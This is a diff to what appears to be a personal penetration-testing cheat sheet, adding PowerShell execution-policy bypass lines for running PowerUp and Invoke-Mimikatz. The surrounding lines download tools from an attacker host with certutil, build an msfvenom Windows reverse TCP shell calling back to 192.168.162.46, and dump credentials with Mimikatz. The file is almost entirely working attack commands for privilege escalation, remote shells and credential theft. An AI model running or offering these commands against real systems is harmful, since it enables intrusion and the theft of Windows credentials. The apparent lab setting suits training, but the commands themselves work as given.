@@ -285,7 +285,8 @@ cd ~/lab/
 cp ~/tools/privesc_windows/PowerUp.ps1 . 
 webup 80 
 certutil -urlcache -split -f http://192.168.162.46:80/PowerUp.ps1 
-powershell.exe -exec bypass -Command "& Import-Module .\\PowerUp.ps1;Invoke-AllChecks"
+powershell -exec bypass -Command "& Import-Module .\\PowerUp.ps1;Invoke-AllChecks"
+powershell -nop -noexit -exec bypass -c '.\PowerUp.ps1'
 msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.162.46 LPORT=80 -f exe -o mike80.exe 
 webup 80 
 certutil -urlcache -split -f http://192.168.162.46:80/mike80.exe 
@@ -446,7 +447,7 @@ klist
 ================================== 
 mimikatz powershell
 powershell -ep bypass .\Invoke-Mimikatz.ps1
-
+powershell -nop -noexit -exec bypass -c '.\Invoke-Mimikatz.ps1' 
  
 ================================== 
 Bloodhound 
